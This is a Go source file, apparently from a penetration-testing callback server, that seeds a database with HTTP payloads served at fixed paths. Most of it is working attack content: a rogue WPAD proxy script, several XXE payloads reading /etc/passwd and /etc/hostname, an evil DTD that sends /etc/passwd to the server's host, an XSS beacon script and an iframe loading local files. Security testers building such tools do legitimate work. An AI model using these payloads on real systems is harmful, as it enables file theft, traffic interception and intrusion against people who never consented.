package httpx

import (
	"github.com/defektive/xodbox/pkg/app/model"
	"gorm.io/gorm"
)

func Seed(dbh *gorm.DB) {
	seedFns := []func(db *gorm.DB) *gorm.DB{
		seedBreakfastBot,
		seedHello,
		seedWPAD,
		seedXXEEtcHostname,
		seedXXERemoteRef,
		seedEvilDTD,
		seedXSSJS,
		seedHTMLIFrameEtcPasswd,
		seedSVGXXE,
	}

	for _, fn := range seedFns {
		tx := fn(dbh)
		if tx.Error != nil {
			lg().Error("Error seeding database payload", "err", tx.Error)
		}
	}
}

func seedBreakfastBot(dbh *gorm.DB) *gorm.DB {
	h := newDefaultPayload("^/", -1000)
	h.Data = PayloadData{
		Headers: map[string]string{
			"Server": "BreakfastBot/1.0.0",
		},
	}

	return dbh.Create(h)
}

func seedHello(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload("/hello$", 1, "application/json", []byte(`{"data":"hello world"}`))
	return dbh.Create(h)
}

const WPAD_SCRIPT = "function FindProxyForURL(url, host){if ((host == \"localhost\") || shExpMatch(host, \"localhost.*\") ||(host == \"127.0.0.1\") || isPlainHostName(host)) return \"DIRECT\"; if (dnsDomainIs(host, \"{{.ProxySrvRegex}}\")||shExpMatch(host, \"(*.{{.ProxySrvRegex}}|{{.ProxySrvRegex}})\")) return \"DIRECT\"; return 'PROXY {{.ProxySrv}}:3128; PROXY {{.ProxySrv}}:3141; DIRECT';}"

func seedWPAD(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/wpad\.dat`, 1, "text/javascript", []byte(WPAD_SCRIPT))
	return dbh.Create(h)
}

func seedXXEEtcHostname(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/sh$`, 1, "text/xml", []byte(`<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`))
	return dbh.Create(h)
}

func seedXXERemoteRef(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/dt$`, 1, "text/xml", []byte(`<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .AlertPattern }}/xxe-test" >]><foo>&xxe;</foo>`))
	return dbh.Create(h)
}

func seedEvilDTD(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/evil.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
	return dbh.Create(h)
}
func seedXSSJS(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/js$`, 1, "text/javascript", []byte(`var s = document.createElement("img");document.body.appendChild(s); s.src="//{{ .Host }}/{{.AlertPattern}}/s";`))
	return dbh.Create(h)
}
func seedHTMLIFrameEtcPasswd(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/ht$`, 1, "text/html", []byte(`<html><body><img src="{{.AlertPattern}}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`))
	return dbh.Create(h)
}

func seedSVGXXE(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/sv$`, 1, "image/svg+xml", []byte(`<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`))
	return dbh.Create(h)
}

func newDefaultPayload(pattern string, sortOrder int) *HTTPPayload {
	n := NewHTTPPayload()
	n.Project = model.DefaultProject()

	n.Pattern = pattern
	n.SortOrder = sortOrder

	return n
}

func newDefaultSimplePayload(pattern string, sortOrder int, contentType string, body []byte) *HTTPPayload {
	n := newDefaultPayload(pattern, sortOrder)
	n.Data = PayloadData{}

	if contentType != "" {
		n.Data.Headers = map[string]string{
			"Content-Type": contentType,
		}
	}

	if len(body) > 0 {
		n.Data.Body = body
	}

	return n
}
